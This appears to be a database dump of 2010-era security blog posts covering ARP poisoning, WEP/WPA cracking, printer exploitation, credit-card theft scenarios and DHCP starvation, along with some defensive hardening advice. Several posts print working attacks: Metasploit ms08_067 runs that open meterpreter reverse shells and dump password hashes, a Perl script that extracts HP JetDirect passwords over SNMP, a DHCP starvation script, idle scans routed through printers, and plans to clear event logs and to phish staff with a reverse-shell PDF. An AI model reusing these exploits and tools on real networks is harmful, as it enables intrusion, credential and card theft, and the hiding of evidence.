generating the traffic that we need to collect to crack the IV\'s.  The attacker will need about 20,000 IV\'s in order to crack a WEP key.  It takes about 5 minutes, so very little patience is needed.  Once the IV\'s are collected, it takes my laptop about 30 seconds to crack a 128bit key.  Once I have the key, I\'m in.\n\nThe other type of network is WPA+TKIP or PSK.  These work differently, as they don\'t transmit IV\'s with each packet.. but the key is sent when the client first connects.  No one wants to sit around and wait for a client to disconnect and reconnect, though.. that could take forever.  So, what we do, is run our sniffer, associate with the AP and send a deauthenticate packet spoofed from one of the clients.  This will disconnect the client and the client will automatically try to reauthenticate.  When it does, we\'ll be listening and will catch the key with our sniffer.  Then, we run a simple brute force attack against it.  Depending on how difficult the key is, it could take 2 seconds, or 2 years.  I\'ve yet to encounter one that takes longer than 10 minutes.\n\nOK, so, now we\'re connected to a wireless network.  Unlike the previous example, where an attacker compromises a windows box and utilizes a tool called Cain & Abel, in this scenario he\'s connected via his own computer.  Because of the tools used to hack a wireless network, we\'ll assume he\'s using Linux.\n\nHe\'ll now use a tool named Ettercap to perform a MitM attack against the network.  Once again, he\'ll poison the ARP table and redirect network traffic through his computer before sending it to the gateway.  By doing so, he\'ll collect all the data going in and out of the network.\n\nOne frightening point to include here is that Ettercap has the ability to forge SSL certificates, meaning that it will also collect encrypted network traffic.  This means that he\'s not just going to be collecting mostly benign data, he\'ll now be collecting usernames and passwords to banks and financial websites.\n\nPart 3 of this post is going to talk about measures you can take to protect yourself from these attacks.\n','','2010-04-03 15:55:34','2010-04-03 20:55:34','','','2010-04-03 15:55:34','2010-04-03 20:55:34','arp-poisoning-and-man-in-the-middle-attacks-part-2','0','','publish','ARP Poisoning and Man in the Middle Attacks [part 2]','post','');

Shred everything, including our used toilet paper, don\'t buy anything on the internet, or over the telephone, etc.. yet, there\'s absolutely nothing that we can do to protect ourselves from fraud when it comes down to the ignorance of the stores that we physically shop at or do business with.\n\nLets take a quick look at how a POS system is set up with credit card processing.\n\n1) There\'s a POS (point of sale) unit which does the check out.\n2) There\'s a server, or servers, located in some backroom, hopefully physically secured, that sends the data received from the POS to a processing company.  The processing company responds with a \"YAY\" or \"NAY\" to determine if the transaction will go through.  When approved, the processing company charges the card on behalf of the retailer.\n3) The \"YAY\" or \"NAY\" message is sent back to the POS, letting the cashier know that the transaction was approved or denied.\n\nViola, the process is complete.\n\nNow, lets look at it from the standpoint of attack vectors..\n\n1) Is the POS used for anything other than swiping cards and taking orders?  Usually they\'re not, because the POS software is the only thing that runs on these terminals.  But...\n2) How does the POS transmit the data to the server in the back?  Wired?  Wireless?  Hamsters?\n3) Is the server responsible for doing the processing used for anything other than processing transactions?  (Web browsing, email, whatever)\n4) Does the firewall prohibit data streams from being set up to send data, normally intended just for the processing company (ie - Visa), to some other destination?\n5) What type of antivirus/antispyware/antimalware is running on the server?\n6) What OS does the server use?\n7) Is the wireless network provided as a courtesy to your customers properly segregated from the business network?\n\nBig corporate companies have already learned these lessons via the school of hard knocks.. so, they\'ve spent millions doing their best to make sure that they don\'t get owned.  However, as in the story, small businesses usually don\'t.  I\'m going to take a quick stab at the set up at Mad Cappers Saloon..\n\nPOS is probably running Windows with some POS software running on it.  Employees may or may not be able to minimize the POS screen to access a web browser.  The data is probably sent to the server in the back via a wired network (because I believe this place is older than wireless.. if it were newer, I would guess wireless).  The server in the back is probably also running Windows connected to the internet via cable or DSL.. and when business is slow, I\'ll bet this computer is used for non-business related stuff.  As far as the firewall rules.... what firewall?\n\nSo, how would I target this setup?  Simple.. Send an email to the owner with a link to a website that I\'ve created that will exploit a vulnerability in his/her browser, install my personally crafted malware on their machine, which either gives me direct access into the server, or simply just sets up a sniffer to collect data streams and forward them to me.\n\nI then wait until the next business day and check my database of sniffed information, and viola.. credit cards.\n\nThere are probably a million other ways to target this set up, but that would be the most simple.\n\nSo, when the owner of Mad Cappers Saloon says, \"We\'re sorry, but this isn\'t our fault!\".. is that really true?  I mean, last I checked, ignorance isn\'t bliss.  If you get pulled over for doing 290mph in a 55 and say, \"Oh.. I haven\'t seen a speed limit sign\".. you\'re still going to jail.  So, if you get hacked and all of your customers personal financial information is compromised because you don\'t know what a firewall is, or a hidden data stream, aren\'t you equally as guilty?\n\nIn my opinion, yes, yes you are.  When I give you my card to swipe, I expect that you\'ve taken safeguards to make sure that my money isn\'t stolen due to your to your ignorance because you\'ve hired someone to set up and secure your network for you.  If you have, and my information still gets stolen, well, then it\'s the company that set up your network\'s fault.\n\nWhat I really hope to see come from this, is lawsuits.  I want to see these companies getting sued for neglecting to install proper safeguards to ensure their customers privacy and security.  If companies start to get sued because they\'ve neglected to do things the proper way, companies will start to do things properly!  It\'s unfortunate, but it\'s true.\n\nNext time you swipe your card, or give your card to the waiter/waitress.. I\'ll bet you\'ll think about this.. unfortunately, there\'s no a whole lot that you can do unless you resort back to using cash.','','2010-04-15 13:50:51','2010-04-15 18:50:51','','','2010-04-15 13:50:51','2010-04-15 18:50:51','malwarespyware-and-your-credit-card','0','','publish','Malware/Spyware and your credit card.','post',''),(

Not good.\n\n<blockquote>\n<pre>\nmsf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set RHOST 192.168.0.11\nRHOST => 192.168.0.11\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.0.100\nLHOST => 192.168.0.100\nmsf exploit(ms08_067_netapi) > exploit\n\n.....\n[*] Meterpreter session 1 opened (192.168.0.100:4444 -> 192.168.0.11:1251)\nmeterpreter > pwd\nC:WINNTsystem32\n</pre>\n</blockquote>\n\nThe whole process took less than a minute.  From here, if I were actually attacking this network instead of just pen testing, I would inject a VNC DLL and get remote access to the desktop, allowing me to literally control physical access to their office.  IE - lets just turn off the security system so I can walk right into the building after hours without having to use a pesky fob.\n\nPatch your systems, people.

Why?  Because all they\'re supposed to do is print.  You plug them in, install a driver, and so long as the end user can print, all is well in the world.\n\nThanks to this misconception, we can use network printers to gather boat loads of information, as well, as bounce through them when port scanning, cause disruption, and, well, screw with people.  ;-)\n<!--more-->\n\nFirst, printers are PERFECT boxes to use when doing a bounce (aka, IPID, zombie, idle, etc.) scan.  Example:\n\n<blockquote>\n<pre>\nnmap -sS -p9100 10.0.0.* --open\n..snip..\nNmap scan report for 10.0.0.23\nHost is up (0.00055s latency).\nPORT     STATE SERVICE\n9100/tcp open  jetdirect\n..snip..\n</pre>\n</blockquote>\n\nOk, so we know that .23 is a printer.  Yay.. lets see how much activity this thing is seeing at the moment..\n\n<blockquote>\n<pre>\nhping3 10.0.0.23 -r -p 31337\nHPING 10.0.0.23 (eth0 10.0.0.23): NO FLAGS are set, 40 headers + 0 data bytes\nlen=46 ip=10.0.0.23 ttl=64 id=54757 sport=31337 flags=RA seq=0 win=0 rtt=0.6 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=1 win=0 rtt=0.9 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=2 win=0 rtt=0.7 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=3 win=0 rtt=0.7 ms\nlen=46 ip=10.0.0.23 ttl=64 id=+1 sport=31337 flags=RA seq=4 win=0 rtt=0.8 ms\n</pre>\n</blockquote>\n\nSweet.. each IP ID is incremented by 1, this indicates that there\'s no other traffic on this printer at the moment.  We can use this to bounce through when doing a scan against the PDC..\n\n<blockquote>\n<pre>\nnmap -Pn -sI 10.0.0.23:31337 -p21,22,139,445 10.0.0.5\n\nIdle scan using zombie 10.0.0.23 (10.0.0.23:31337); Class: Incremental\nNmap scan report for 10.0.0.5\nHost is up (0.017s latency).\nPORT    STATE           SERVICE\n21/tcp  closed|filtered ftp\n22/tcp  closed|filtered ssh\n139/tcp open            netbios-ssn\n445/tcp open            microsoft-ds\n</pre>\n</blockquote>\n\nNice.. I think we found our target..\n\n<blockquote>\n<pre>\nsnmpwalk -c public -v1 10.0.0.5|grep Windows\n..snip..\nHOST-RESOURCES-MIB::hrSWInstalledName.22 = STRING: \"Windows Server 2003 Service Pack 2\"\n..snip..\n\nnmap -p445 --script=smb-check-vuln* 10.0.0.5|grep VULN\n|   MS08-067: VULNERABLE\n</pre>\n</blockquote>\n\nOk, so we definitely found our target..\n\n<blockquote>\n<pre>\nmsfcli windows/smb/ms08_067_netapi payload=windows/meterpreter/reverse_tcp RHOST=10.0.0.5 TARGET=8 LHOST=10.0.0.58 E\n[*] Please wait while we load the module tree...\n[*] Started reverse handler on 10.0.0.58:4444 \n[*] Attempting to trigger the vulnerability...\n[*] Sending stage (748032 bytes) to 10.0.0.5\n[*] Meterpreter session 1 opened (10.0.0.58:4444 -> 10.0.0.5:2371)\n\nmeterpreter > hashdump\nAdministrator:500:passwordhashhere:::\nGuest:501:passwordhashhere:::\nkrbtgt:502:passwordhashhere:::\n</pre>\n</blockquote>\n\nThe initial scan will look like it came from 10.0.0.23.. after exploited, I\'ll clean out the event log, so the only thing the admin would see is that one of his printers port scanned his PDC, and that\'s only if he\'s running some kind of network monitor outside of the event log.  That\'s also assuming that I don\'t turn on remote desktop, connect, and clean out that log, too.  ;-)\n','','2010-04-30 11:16:47','2010-04-30 16:16:47','','','2010-04-30 11:16:47','2010-04-30 16:16:47','fun-with-printers-part-1','0','','publish','Fun with printers (part 1)','post','');

'645','1','open','http://www.attackvector.org/?page_id=645','0','open','','2','Spend time around Mac users, and you will eventually hear one of them mention the immunity myth. If you\'re not familiar with it, allow me to explain; the myth states that Macs are, because of the way in which the OSX is built, immune to viruses. Not less susceptible, but actually immune. \n\nI think it\'s time we burst that particular theory bubble. \n\nI know as well as you do that anything is hackable, given the resources and enough time to do so. To suggest that a Mac is more secure is one thing - arguably, in a fresh state, OSX would beat Windows in terms of its base security level. But when you start to surf the web and allow the internet to connect to your Mac, the chances are that something will eventually slip onto the machine. \n\nAdmittedly, there are a lot of secure sites out there, and that reassuring \"HTTPS\" is getting more and more common. Sites for your bank (HSBC have authenticator hardware being sent out), for your mobile bill (<a href=\"http://www.o2.co.uk/broadband/\">www.o2.co.uk</a> is a good example) are all reliable and familiar, but unfamiliar sites should make Mac users just as wary as those on Windows, or Linux. \n\nSpeaking of Linux, a few people will argue that the reason Macs are immune is that hackers don\'t see them as worth their time, given the small install base when compared to that of Windows. But just because the install base is small doesn\'t mean that they\'re less likely to be hacked. A Windows machine will, on average, cost you less than an OSX device. For this reason, surely Mac users would have more in their accounts? If anything, Mac users are generally designers, creative types, who have the disposable income to afford a pricey computer, so for those aiming for bank details, it\'s statistically the more logical choice. \n\nOSX Lion adds FileVault 2, which is a more efficient version of its predecessor, allowing users to encrypt their files more rapidly and easily than before. But again, none of this is impervious - everything can be hacked, and although most people would assume that this defeatist outlook means antivirus software has no use and we should simply sit back and take the hits, it doesn\'t. Back up your files, encrypt them, sweep for malware, no matter what operating system you\'re on. Mac users are not immune, and those who think they are may one day get a rather unpleasant wake up call. \n','','2011-08-23 11:23:57','2011-08-23 16:23:57','','','2011-08-23 11:23:57','2011-08-23 16:23:57','the-mac-immunity-theory','0','','publish','The Mac Immunity Theory','page',''),(

Here\'s the code:\n<br>\n<pre lang=\"perl\" line=\"1\">\n$eth = $ARGV[0];\n\nif($eth eq \"\") {\n  print \"Usage: jetpwn.pl n\";\n  exit(0);\n}\n\nsub convert {\n  my $string = @_;\n  ($string = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;\n  return $string;\n}\n\n@ifconf = `ifconfig $eth`;\n\nforeach $line (@ifconf) {\n  if($line =~ /inets+addr:(d+.d+.d+).*/) {\n    $range = $1;\n    print \"Using range $range.1-255n\";\n  }\n}\n\n# I rely on nmap to do my scanning, even within scripts, because IO::Socket\'s timeout of \'1\'\n# is too slow, and writing a script to do a half-open scan using perl\'s raw socket and pcap\n# libraries is somewhat overly complicated and not nearly as accurate as nmap.  Plus,\n# it\'s reinventing the wheel.  So, nmap it is!\n\nopen(NMAP, \"nmap -sS -p9100 $range.* --open|\") || die \"$!\";\nwhile() {\n  if(/^.*?((d+.d+.d+.d+))$/) {\n    push(@ips, $1);\n  }\n}\n\nforeach $ip (@ips) {\n  # I wont lie.. using snmpget instead of Perl\'s snmp lib is just pure laziness.  Heh heh\n  open(SNMP, \"snmpget -v 1 -c public $ip .1.3.6.1.4.1.11.2.3.9.1.1.13.0|\") || die \"$!\";\n  while() {\n    print \"Password for JetDirect running on $ipn\";\n    if(/^.*?Hex-STRING:s+(.*)/) {\n      $hexpass = $1;\n      print \"Hex password: $hexpassn\";\n      ($hexpass) =~ s/s+//eg;\n      $pass = &amp;convert($hexpass);\n      $pass =~ s/=108;//eg;\n\n      print \"ASCII password: $passnn\";\n    }\n  }\n}</pre>\n\nIt utilizes a \"vulnerability\" in the MIB\'s that the HP printers use.. so, using that OID (.1.3.6.1.4.1.11.2.3.9.1.1.13.0), the printer will display the password in hex.. so a simple conversion will give it to you in ASCII.  The passwords are case insensitive, even though they\'ll be displayed uppercase.\n\nHint.. add the passwords found to your wordlist.  Often the passwords are not unique to the printer.\n\nSo, now you have full control over the printer.. whether it has a password or not.  Now what?\n\n<blockquote>\n<pre>snmpwalk -c public -v1 10.0.0.22</pre>\n</blockquote>\n\nI\'m not going to paste the output, because there\'s a ton.. but go through the results and you\'ll find interesting information about the network, and who knows what else.\n\nAlso, open up a web browser and go to \"http://ip\" and you can play with all sorts of fun stuff there, depending on the printer version.  One suggestion.. via the web interface, you can enable and disable services.\n\nBeyond that, there\'s much fun to be had using PJL (Printer Job Language).  One of the most widely known PJL commands is:\n\n<blockquote>\n<pre>echo \"@PJL RDYMSG DISPLAY=\"Interwebz!!\"|nc  9100</pre>\n</blockquote>\n\nThat will change the default \"ready message\" that\'s displayed on the LCD screen of an HP printer.  It can be a fun prank if you\'re creative enough.. especially if you script it to change all the printers on the network ;-)\n\nFun, but doesn\'t accomplish much..\n\nI highly recommend reading this document, as it describes PJL really well.\n\n<a href=\"http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf\">http://h20000.www2.hp.com/bc/docs/support/SupportManual/bpl13208/bpl13208.pdf</a>\n\nWe\'re actually going to use a program called \"HiJetter\" to accomplish this.  Essentially, HiJetter is a front-end to commands like this:\n\n<blockquote>\n<pre>@PJL DEFAULT HOLD=STORE</pre>\n</blockquote>\n\n;-)\n\nAnyway, Download the windows binary from here <a href=\"http://www.phenoelit-us.org/fr/tools.html\">http://www.phenoelit-us.org/fr/tools.html</a>\n\nYes, download the Windows binary even if you\'re running linux.  Unzip it and run it with \'wine Hijetter.exe\'.  The *nix version does not compile.. at all.\n\nNOTE:  HiJetter is not perfect.  It crashes quite often, so patience is a virtue.  I might rewrite it.. we\'ll see.\n\nOnce Hijetter is running, you\'ll have total control over the printer.. even access to the stored print jobs.\n\nSo, lets say you turn on job holding and you tell it to store, whether that be via Telnet or HiJetter.  The documents are all stored in\n\n<blockquote>\n<pre>0:savedevicesavedjobsheldjobs</pre>\n</blockquote>\n\nYou will be able to download images of anything sent to the printer.  Checks, invoices, all sorts of confidential information.\n\nAlso, you can upload files to the printer do be hosted on its built in web server.  This feature is useful for a number of reasons.. but my primary use is..\n\nLets say that the LAN is heavily firewalled.  Lets also say that on these gateways, they\'re running scanning proxies to check for viruses and malware going in and out of the network via web/email/etc.  Lets also say that they\'re running Snort to check for more serious exploits.  Lets say, though, that they have a wireless network set up for guests to use when they come to the office.\n\nI take a little trip and find the wireless network.  Whether it\'s WEP, or WPA, I\'m getting in.  Once in, I don\'t want to stick around for very long, so I look for printers (ok, maybe they\'re not my first target, but if nothing else pans out in short order, I\'m hitting them..).  I craft a PDF that opens a reverse connect backdoor, which points to my IP back at home (this is a pen test, so I don\'t care if they know my IP).  I upload this to their printer(s) and head home.\n\nOnce home, I craft an email to the receptionist.  (hint: contact@ usually goes to the receptionist and their job involves opening emails from random people).  This email contains a link to our special PDF, which is hosted on one of their printers, which will prevent any code actually being scanned by their firewalls/IDS/etc.  When the end user is infected, it reverse connects to me via port 80, or 443, so it looks like innocent web traffic.\n\nI hope this post gives some idea as to the dangers of network printers.  They\'re a very weak network device that is easily, easily compromised in a number of ways.  I would suggest going through that document about PJL commands and check out some of the fun stuff that you can do with it.','','2010-05-01 13:18:04','2010-05-01 18:18:04','','','2010-05-01 13:18:04','2010-05-01 18:18:04','fun-with-printers-part-2','0','','publish','Fun with printers (part 2)','post',''),(

But, lets start with ARP poisoning.\n\nYou want to make sure that every host on the network knows exactly what the gateways mac address is and you want to make sure the gateway knows exactly which host has which mac address.  Additionally, you want to make sure each host knows the mac address of all the other hosts.\n<!--more-->\nWe do this by configuring static mac addresses, which all but eliminates ARP on the network.\n\nOn Linux, you would create your static mac entries in <code>/etc/ethers</code>.  The format of this file looks like this:\n\n<blockquote>\n<pre>\n# gateway.mynetwork.com - Cisco\n192.168.0.1           00:00:0C:11:22:33\n\n# workstation1.mynetwork.com - Dell\n192.168.0.100        00:11:43:11:22:33\n</pre>\n</blockquote>\n\nSo on and so forth.  To utilize this file, you simply type\n\n<blockquote>\n<pre>\n$ arp -f\n</pre>\n</blockquote>\n\nThis tells \'arp\' to load all of the mac addresses and associated IP addresses from /etc/ethers and add them to the arp table staticly.  This will prevent them from being over written in the event of a MitM attack.\n\nOn Windows, it\'s a bit different because they neglected to add a switch to their arp command to load the mac addresses from a file, like the way Linux does it.  So, you have to create a batch file that looks like this:\n\n<blockquote>\n<pre>\n@echo off\nREM gateway.mynetwork.com - Cisco\narp -s 192.168.0.1 00-00-0C-11-22-33\n\nREM workstation1.mynetwork.com - Dell\narp -s 192.168.0.100 00-11-43-11-22-33\n</pre>\n</blockquote>\n\nSo, obviously trying to maintain something like this by hand is going to be a royal pain.  Well, you\'re welcome in advance.  I\'ve written tools to create and maintain these lists with very little involvement on your part.  ;-)\n\nThe first one that I wrote is 100% Perl, which might be useful if, for some reason, you don\'t have access to nmap.\n<p>\n<pre>\n#!/usr/bin/perl\nuse Net::ARP;\nuse Net::Ping;\n\n$dev = $ARGV[0];\n\nif($dev eq \"\") { \n      print \"Usage: $0 eth<#>n\";\n      exit(0);\n}\n\n@if = `ifconfig $dev`;\nforeach $line (@if) {\n      if($line =~ /^.*?inets+addr:(d+.d+.d+)..*/) {\n            $range = $1;\n            last;\n      }\n}\n\nopen(F, \">>dev.txt\") || die \"$!\";\n\nfor($i = 0;$i < \"255\"; $i++) {\n      $ipr = \"$range.\".$i.\"\";\n      $ping = Net::Ping->new(\"icmp\");\n      if($ping->ping($ipr, \"1\") eq \"1\") {\n            $mac = Net::ARP::arp_lookup($dev, \"$ipr\");\n            if($mac =~ /unknown/) { next; }\n            print \"$ipr $macn\";\n            print F \"$iprt$macn\";\n      }\n      $ping->close();\n}\n</pre>\n<br>\nYou can take the output from this and dump it right into /etc/ethers without having to do anything else.  To use this on windows, however, there\'s some formatting that needs to be done.  The most simple way to accomplish the formatting is by doing this:\n\n<blockquote>\n<pre>\n$ cat dev.txt\n192.168.0.1 	00:00:0C:11:22:33\n192.168.0.100	00:11:43:11:22:33\n\n$ cat dev.txt|perl -le \'while(<STDIN>){s/:/-/g; print \"arp -s $_\";}\' >> sarp.bat\n\n$ cat sarp.bat\narp -s 192.168.0.1 	00-00-0C-11-22-33\narp -s 192.168.0.100	00-11-43-11-22-33\n</pre>\n</blockquote>\n\nNow you can use \"dev.txt\" as /etc/ethers, and transfer \'sarp.bat\' over to a share that all of the windows boxes can access and have them run that file as a start up script.\n\n<b>UPDATE</b>: If you want more information in your /etc/ethers file, you can use this script instead of the previous one.  It produces a lot more data and is quite a bit faster.\n<p>\n<pre>\n# Creates a static arp table from the output of:\n# nmap -oX output.xml -sP 192.168.0.* (or whatever range you exist on)\n# Should be put in /etc/ethers and implemented\n# using \'arp -f\', which automatically reads /etc/ethers by default.\n#\n# When running \'arp -f\', you\'ll encounter this error:\n# SIOCSARP: Invalid argument\n# arp: cannot set entry on line <whatever> of etherfile /etc/ethers !\n# This is because you can\'t add a static arp entry for your own IP/MAC.\n# You can either ignore this error, or remove this entry.  Makes no\n# difference.   \n\n$dev = $ARGV[0];\nif($dev eq \"\") {\n  print \"Usage: ethers.pl <dev>n\";\n  print \"IE: ethers.pl eth0n\";\n  exit(0);\n}\n\n@ifconf = `ifconfig $dev`;\n   \nforeach $line (@ifconf) {\n  if($line =~ /inets+addr:(d+.d+.d+).d+.*/) {\n    $range = $1;\n    print \"Using range: $range.*n\";\n  }\n}\n\nsystem(\"nmap -oX output.xml -sP $range.*\");\n\nprint \"Generating output for file...n\";\nsleep 1;\n\nopen(F, \"output.xml\") || die \"$!\";\nopen(E, \">>ethers\") || die \"$!\";\nwhile(<F>) {\n  if(/^<host>.*?state=\"down\".*/) { next; }\n  if(/^<host>.*?state=\"up\".*/) { \n    $host = 1;\n  }\n  if(/^.*?addr=\"(d+.d+.d+.d+)\".*/ && $host == \"1\") {\n    $ip = $1;\n  }\n  if(/^.*?addr=\"(.*?)\"s+.*?vendor=\"(.*?)\".*/ && $host == \"1\") {\n    $mac = $1;\n    $vendor = $2;\n  }\n  if(/^.*?hostnames+name=\"(.*?)\".*/ && $host == \"1\") {\n    $desc = $1;\n  }\n  if(/^</host>/ && $host == \"1\") {\n    $host = 0;\n    print \"# $desc - $vendorn\";\n    print \"$ipt$macnn\";\n    print E \"# $desc - $vendorn\";\n    print E \"$ipt$macnn\";\n  }\n}  \n   \nclose(F);\nclose(E);\n</pre>\n\nSo, this takes care of the workstations.. what about the gateway?\n\nThis is where things suck a bit.  Unless you\'re running Linux (or Cisco, or Juniper, or, or, or)...(or, I suppose, Windows, too) as a gateway, you\'re somewhat hindered.  If you\'re running Linux or Windows as a gateway, you can simply use the same method as used above to pull off static arp tables.\n\nIf you\'re running a DLink, Netgear, Linksys, etc.. you\'re kind of up a creek unless the firmware that you\'re running gives the option to do mac address filtering.  That said, I\'m not entirely sure that mac address filtering and static arp tables are one in the same.  Anyone know?\n\nIf, however, your gateway does support mac address filtering, I highly suggest enabling it.  *Especially* on wireless networks.\n\nThe other thing that this accomplishes, which is kind of nice when working on a larger network, is that it prevents someone from accidentally configuring their IP to the same as someone else\'s.\n\nThe next post will discuss the MitM attack method using ICMP redirects and prevention.','','2010-05-04 11:58:23','2010-05-04 16:58:23','','','2010-05-04 11:58:23','2010-05-04 16:58:23','arp-poisoning-and-man-in-the-middle-attacks-part-3','0','','publish','ARP Poisoning and Man in the Middle Attacks [part 3]','post','');

There are a few other methods used to do MitM as well.\n\nThe second method uses ICMP redirect messages to tell the network that the gateway has moved, and vice versa.\n\nA brief description of ICMP redirect:\n<!--more-->\n<blockquote>\nICMP redirect messages are used to redirect a source host to use a different gateway that may be closer to the destination. These redirect messages are sent by the receiving gateway and the source host should adapt it\'s forwarding accordingly when receiving this message. ICMP Redirects are most often used in source routing environments where the source host calculates routing paths to all destinations itself.\n</blockquote>\n\nSo, a hacker would send an ICMP redirect, pretending to be the router/gateway, to a host machine on the network, telling it that the hackers machine is the better gateway and the host should use that instead of the actual gateway.  Incredibly simple attack to pull off.  Thankfully, it\'s also relatively simple to block.\n\nOn Linux, there are a number of options depending on what distro you\'re using.  The easiest way is to use \'sysctl\' to disable the acknowledgement of redirect messages.  These are rarely, if ever, used for legitimate purposes on most networks, so disabling them doesn\'t have any real side effects.\n\nTake a look in your /etc/sysctl.conf file.  It\'s well documented and generally they have recommendations listed in the file.  Mine looks like this:\n\n<blockquote>\nnet.ipv4.icmp_echo_ignore_broadcasts = 1\nnet.ipv4.icmp_ignore_bogus_error_responses = 1\nnet.ipv4.conf.all.accept_redirects = 0\nnet.ipv4.conf.all.send_redirects = 0\nnet.ipv4.conf.all.accept_source_route = 0\nnet.ipv4.conf.all.log_martians = 1\n</blockquote>\n\nThis tells my box not to accept ICMP redirects, nor will it accept source route packets.  Then add\n\n<blockquote>\n/sbin/sysctl -p\n</blockquote>\n\nto /etc/rc.local.\n\nTo block ICMP redirect attacks against Windows, as usual, it\'s not quite as easy.\n\nOpen regedit and modify the following key\n\n<blockquote>\nHKEY_LOCAL_MACHINESYSTEMCurrentControlSetServicesTcpipParameters\n\nand set EnableICMPRedirect to 0\n</blockquote>\n\nThere are about 10 other ways of executing a MitM attack, but these are the two most used methods in my experience.  Here\'s a <a href=\"http://alor.antifork.org/talks/MITM-cisco.ppt\">document</a> that describes some of the other attack methods and possible prevention options.\n','','2010-05-04 12:44:35','2010-05-04 17:44:35','','','2010-05-04 12:44:35','2010-05-04 17:44:35','arp-poisoning-and-man-in-the-middle-attacks-part-3-1','0','','publish','ARP Poisoning and Man in the Middle Attacks [part 3.1]','post',''),(

I needed to paste this somewhere for the time being and it\'s not completely functional.\n\n<b><u>Update:</u></b> Upon going through RFC 3118, I figured out what needs to be added/modified in this code.  I will be working on it over the next few days, but it appears that first I need to rewrite/fix/do something with the Net::ARP module for Perl.  It\'s crap.  If I can get this to work well enough, I\'ll consider porting it to C.\n\nIn the mean time, go read <a href=\"http://www.ietf.org/rfc/rfc3118.txt\">RFC 3118</a>.  Specifically section 9.  Based on that, I\'m not sure that the DHCPINFORM packet is necessary in the code below.\n\nThe theory is.. send DHCPDISCOVER using spoofed UDP packets sent directly to the DHCP server.  Use libpcap to sniff for ARP requests from the DHCP server and respond using the same spoofed MAC addresses used in the initial packet(s).  This will set up fake hosts on the network and exhaust the DHCP server\'s IP pool, which will then make a DHCP MITM attack much easier, as there will be no race.\n\n<pre>\nuse Net::ARP;\nuse Net::DHCP::Packet;\nuse Net::DHCP::Constants;\nuse Net::RawIP;  \nuse Net::Ping;\n\n$dest = $ARGV[0];\n$eth = $ARGV[1];\n$max = $ARGV[2];\n\nsub randmac() {\n  $mac = join(\":\", \"00\", \"40\", \"96\", map int rand 99, 1 .. 3);\n  return($mac);\n} \n\nsub randip() { \n  $ip = join(\".\", map int rand 254, 1 .. 4);\n  return($ip);\n} \n\nsub lrandip() {\n  @ifconfig = `ifconfig $eth`;\n  foreach $line (@ifconfig) {\n    if($line =~ /^.*?inet addr:(d+.d+.d+).d+s+.*/) {\n      $lip = join(\".\", $1, int(rand(254)));\n    }\n  }\n  return $lip;   \n}\n\n$psocket = new Net::RawIP({udp=>{}});\n$isock = new Net::RawIP({udp=>{}});\n$ping = Net::Ping->new(\"icmp\");\n$ping->ping($dest, \"1\");\n$dmac = Net::ARP::arp_lookup($eth, $dest);\n\nprint \"Mac address of DHCP server: $dmacn\";\nwhile($i <= $max) {\n  $rmac = &randmac;\n  $lrandip = &lrandip;\n  $randip = &randip;  \n    \n  $discover = Net::DHCP::Packet->new(\n                      xid => int(rand(65535)),\n                      Flags => 0x8000,\n                      Chaddr => $rmac,\n                      Ciaddr => $lrandip,\n                      DHO_DHCP_MESSAGE_TYPE() => DHCPDISCOVER()\n                      );\n\n#  $inform = Net::DHCP::Packet->new(\n#                    xid => int(rand(65535)),\n#                    Chaddr => $rmac,\n#                    Ciaddr => $lrandip,\n#                    DHO_DHCP_MESSAGE_TYPE() => DHCPINFORM()\n#                    );\n                       \n  $psocket->set({      \n      ip => {\n            daddr => $dest,\n            saddr => $randip,\n            },\n      udp => {\n            dest => \'67\',\n            source => int(rand(65535)),\n            data => $discover->serialize(),\n            }\n      });\n      $psocket->send(0,1);\n  $isock->set({\n      ip => {  \n            daddr => $dest,\n            saddr => $randip,\n            },\n      udp => {\n            dest => \'67\',\n            source => int(rand(65535)),\n            data => $inform->serialize(),\n            }\n      });\n      $isock->send(0,1);\n\n      Net::ARP::send_packet(\n                $eth,\n                $lrandip,\n                $dest,   \n                $rmac,   \n                $dmac,   \n                \"reply\");\n      $i++;\n}\n</pre>\n</pre>\n','','2010-05-04 22:21:51','2010-05-05 03:21:51','','','2010-05-04 22:21:51','2010-05-05 03:21:51','dhcp-ownage','0','','publish','DHCP ownage. - Update 5.10.2010','post',''),(

Lets take a look at what tcpdump saw during this:\n\n<blockquote>\n# tcpdump -vv host 1.2.3.4\n14:37:12.594695 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 (Broadcast) tell 1.2.3.3, length 28\n14:37:12.594823 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:37:12.718488 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:12.718659 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:37:12.818605 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:12.926535 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.064308 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.251814 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.251988 ARP, Ethernet (len 6), IPv4 (len 4), Reply 1.2.3.4 is-at 00:11:22:33:44:55 (oui Unknown), length 46\n14:37:13.351921 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.459797 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.597487 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.785549 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 1.2.3.4 tell 1.2.3.3, length 28\n14:37:13.893223 ARP, Ethernet (len 6), IPv4 